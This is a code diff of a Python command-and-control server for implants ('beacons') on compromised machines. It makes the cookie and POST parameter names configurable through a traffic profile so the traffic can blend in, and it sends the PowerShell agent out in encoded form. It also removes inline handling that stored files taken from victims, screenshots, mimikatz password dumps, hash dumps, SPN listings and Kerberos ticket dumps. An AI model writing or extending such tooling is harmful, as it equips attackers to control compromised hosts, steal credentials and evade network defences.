@@ -281,7 +281,9 @@ def beaconSendTask(request):
     
     timestamp = int(time.time())
     
-    target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
+    #target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
+    session_id = profile["session_id"]
+    target_data = rx_data(request.cookies.get(session_id)).split("|")
     
     uuid = target_data[0]
     os_version = target_data[1]
@@ -312,7 +314,8 @@ def beaconSendTask(request):
         store_target() # STORE TARGETS
         save_log_json(uuid) # STORE LOGS
         
-        resp = Response(".|0") # THIS NEEDS TO BE CHANGED
+        #resp = Response(".|0") # THIS NEEDS TO BE CHANGED
+        resp = Response("") # THIS NEEDS TO BE CHANGED
         
         # SET PROFILE
         resp = set_headers(profile, "http-get", resp)
@@ -340,7 +343,8 @@ def beaconSendTask(request):
     
     data = tx_data("?|0") # ENCRYPT/ENCODE DATA TO TRANSFER [THIS NEEDS TO BE CHANGED]
 
-    resp = Response(data)
+    #resp = Response(data)
+    resp = Response("")
     
     # SET PROFILE
     resp = set_headers(profile, "http-get", resp)
@@ -353,6 +357,7 @@ def beaconGetData(request):
         if option_base64:
             data = request.data
             data = data.replace("send=", "")
+            data = data.replace(profile["http-post"]["client"]["id"][0]+"=", "")
             #print data
             data_size = sys.getsizeof(data)
 
@@ -361,6 +366,7 @@ def beaconGetData(request):
         else:
             data = request.data
             data = data.replace("send=", "")
+            data = data.replace(profile["http-post"]["client"]["id"][0]+"=", "")
             data = rx_data(data) # DECODE/DECRYPT RECEIVED DATA
             data_size = sys.getsizeof(data)
             data = data.split("\n")
@@ -381,146 +387,8 @@ def beaconGetData(request):
         last_command = gdata.target[uuid]["last_command"].strip()
         if option_debug: print "DEBUG: %s" % last_command
         
-        # DOWNLOADED FILE FROM AGENT
-        if last_command.startswith("download "):
-            timestamp = int(time.time())
-            filename = last_command.split("|")[0].replace("download ","")
-            filename = "%s_%s_%s" % (uuid, timestamp, filename)
-            data = content.split(" ")
-            with open('data/downloads/'+filename, 'wb') as f:
-                for i in data:
-                    f.write(chr(int(i)))
-            content = "download: %s\n\n" % filename
-        
-        # TAKE SCREENSHOT
-        if last_command.startswith("screenshot"):
-            timestamp = int(time.time())
-            filename = "%s_%s" % (uuid, timestamp)
-            data = base64.b64decode(content)
-            with open("data/screenshots/%s.png" % filename, "wb") as f:
-                f.write(data)
-            content = "screenshot: %s.png \n\n" % filename
-        
-        # DUMP CREDS WITH MIMIKATZ
-        if last_command == ("mimikatz"):
-            output = ""
-            for item in parse_mimikatz(content):
-                v_type = item[0]
-                v_domain = item[1]
-                v_user = item[2]
-                v_pass = item[3]
-                v_host = gdata.target[uuid]["name"]
-                
-                h = hashlib.md5()
-                h_data = "%s%s%s%s%s" % (v_type, v_domain, v_user, v_pass, v_host)
-                h.update(h_data)
-                v_id = h.hexdigest()
-                
-                gdata.credentials[v_id] = {
-                    "type": v_type,
-                    "domain": v_domain,
-                    "user": v_user,
-                    "pass": v_pass,
-                    "host": v_host,
-                    "source": "mimikatz"
-                }
-                
-                output += "%s:%s:%s:%s:%s\n" % (v_type, v_domain, v_user, v_pass, v_host)
-            
-            store_credentials()
-            
-            content = "mimikatz ;) \n\n"
-            content += output + "\n"
-        
-        # DUMP HASHES
-        if last_command.startswith("hashdump"):
-            data = content.split("\n")
-            
-            for values in data:
-                if values != "":
-                    item = values.split(":")
-                    
-                    v_type = "hash"
-                    v_domain = ""
-                    v_user = item[0]
-                    v_pass = item[3]
-                    v_host = gdata.target[uuid]["name"]
-                    
-                    h = hashlib.md5()
-                    h_data = "%s%s%s%s%s" % (v_type, v_domain, v_user, v_pass, v_host)
-                    h.update(h_data)
-                    v_id = h.hexdigest()
-                    
-                    gdata.credentials[v_id] = {
-                        "type": v_type,
-                        "domain": v_domain,
-                        "user": v_user,
-                        "pass": v_pass,
-                        "host": v_host,
-                        "source": "hashdump"
-                    }
-            
-            store_credentials()
-        
-        # SEARCH SPNs
-        if last_command.startswith("spn_search"):
-            data = content.split("\n")
-            output = ""
-            
-            for values in data:
-                if values != "":
-                    item = values.split("|")
-                    
-                    v_samaccountname = item[0]
-                    v_serviceprincipalname = item[1]
-                    v_host = gdata.target[uuid]["name"]
-                    
-                    h = hashlib.md5()
-                    h_data = "%s%s" % (v_samaccountname, v_serviceprincipalname)
-                    h.update(h_data)
-                    v_id = h.hexdigest()
-                    
-                    gdata.credentials_spn[v_id] = {
-                        "samaccountname": v_samaccountname,
-                        "serviceprincipalname": v_serviceprincipalname
-                    }
-                    
-                    output += "samaccountname: %s\n" % v_samaccountname
-                    output += "serviceprincipalname: %s\n" % v_serviceprincipalname
-                    output += "\n"
-                    
-            store_credentials_spn()
-            
-            content = "get_spn ;) \n\n" + output
-        
-        # DUMP KERBEROS TGT & TGS WITH MIMIKATZ
-        if last_command.startswith("kerberos_ticket_dump"):
-            data = mimikatz2kirbi(content).split("\n")
-            output = ""
-            
-            for values in data:
-                if values != "":
-                    
-                    v_servername = values.split(":")[0].replace("$krb5tgs$","")
-                    v_john = values
-                    v_host = gdata.target[uuid]["name"]
-                    
-                    h = hashlib.md5()
-                    h_data = "%s%s%s" % (v_servername, v_john, v_host)
-                    h.update(h_data)
-                    v_id = h.hexdigest()
-                    
-                    gdata.credentials_ticket[v_id] = {
-                        "servername": v_servername,
-                        "john": v_john,
-                        "host": v_host
-                    }
-                    
-                    output += "servername: %s\n" % v_servername
-                    
-            store_credentials_ticket()
-            
-            content = "kerberos_ticket_dump ;) \n\n" + output
+        # PROCESS RESPONSE FROM AGENT/TARGET
+        content = control.get_response(content, last_command, uuid)
             
         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         save_log_raw(uuid, "[+] received %s bytes \n[+] received output (%s): \n" % (data_size, str(now)))
@@ -545,11 +413,23 @@ def setAgent(request):
     data += "|%s" % profile["useragent"]
     data += "|%s" % profile["http-get"]["uri"]
     data += "|%s" % profile["http-post"]["uri"]
+    data += "|%s" % profile["http-post"]["client"]["id"][0]
+    data += "|%s" % profile["session_id"]
     data += "|%s" % base64.b64encode(getAgentPS())
     
     timestamp = int(time.time())
     
-    target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
+    #target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
+    #session_id = profile["session_id"]
+    #target_data = rx_data(request.cookies.get(session_id)).split("|")
+    
+    # SEARCH SESSION_ID
+    print request.cookies
+    for cookie_name in request.cookies:
+        try:
+            target_data = rx_data(request.cookies.get(cookie_name)).split("|")
+        except: pass
+    
     uuid = target_data[0]
     os_version = target_data[1]
     user = target_data[2]
@@ -601,7 +481,12 @@ def index():
     return resp
 
 def get_uuid(request):
-    target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
+    profile = load_profile(profile_file)
+    
+    #target_data = rx_data(request.cookies.get('SESSIONID')).split("|")
+    session_id = profile["session_id"]
+    target_data = rx_data(request.cookies.get(session_id)).split("|")
+    
     #print target_data
     uuid = target_data[0]
     os_version = target_data[1]
